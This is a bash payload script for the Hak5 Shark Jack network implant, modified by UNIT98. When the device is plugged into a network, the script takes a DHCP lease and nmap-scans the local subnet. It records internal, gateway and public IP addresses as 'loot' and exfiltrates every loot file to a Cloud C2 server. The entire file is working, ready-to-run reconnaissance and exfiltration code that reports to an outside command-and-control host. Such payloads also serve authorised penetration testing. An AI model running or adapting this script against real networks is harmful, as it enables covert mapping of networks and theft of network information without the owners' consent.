#!/bin/bash
#
# Title: Nmap & IP Info Payload for Shark Jack w/ C2
# Author: Hak5 (modifications from UNIT98)
# Version: 1.1
#
# All credit goes to Hak5 Team :) 
# We stand on the shoulders of giants
#
# Edited to include hak5darren's IP info grabber for extra network information
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder. Exfiltrates all scans to C2 if provisioned.
#
# LED SETUP ... Obtaining IP address from DHCP
# LED ATTACK ... Scanning
# LED FINISH ... Scan Complete
# LED SPECIAL … Cloud C2 Exfiltration
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery with "-v" for more verbose
#

C2PROVISION="/etc/device.config"
NMAP_OPTIONS="-sP -v --host-timeout 30s --max-retries 3"
LOOT_DIR=/root/loot/nmap

# Setup loot directory, DHCP client, and determine subnet

LED SETUP 
SERIAL_WRITE [*] Setting up Nmap Payload
mkdir -p $LOOT_DIR 
COUNT=$(($(ls -l $LOOT_DIR/*.txt | wc -l)+1))
NETMODE DHCP_CLIENT 
while [ -z "$SUBNET" ]; do 
sleep 1 && SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
done 
 
# Scan network 
LED ATTACK 
nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$COUNT.txt

SERIAL_WRITE [*] Setting up IP Payload
PUBLIC_IP_URL="http://ipinfo.io/ip"

function FAIL() { LED FAIL; SERIAL_WRITE [!] Failed to obtain IP address;exit; }
LED SETUP

# Make log file
LOG_FILE="ipinfo_$(find $LOOT_DIR -type f | wc -l).txt"
LOG="$LOOT_DIR/$LOG_FILE"

LED ATTACK
# Gather IP info and save log
INTERNALIP=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F: {'print $2'})
GATEWAY=$(route | grep default | awk {'print $2'})
PUBLICIP=$(wget --timeout=30 $PUBLIC_IP_URL -qO -) || FAIL
echo -e "Date: $(date)\n\
Internal IP Address: $INTERNALIP\n\
Public IP Address: $PUBLICIP\n\
Gateway: $GATEWAY\n" >> $LOG

SERIAL_WRITE [*] Internal IP: $INTERNALIP
SERIAL_WRITE [*] Public IP: $PUBLICIP
SERIAL_WRITE [*] Gateway: $GATEWAY

# Exfiltrate Loot to Cloud C2
if [[ -f "$C2PROVISION" ]]; then
LED SPECIAL 
# Connect to Cloud C2
C2CONNECT
# Wait until Cloud C2 connection is established
while ! pgrep cc-client; do sleep 1; done
# Exfiltrate all test loot files
FILES="$LOOT_DIR/*.txt"
for f in $FILES; do C2EXFIL STRING $f Nmap-C2-Payload; done
else
# Exit script if not provisioned for C2
LED R SOLID
exit 1
fi

LED FINISH
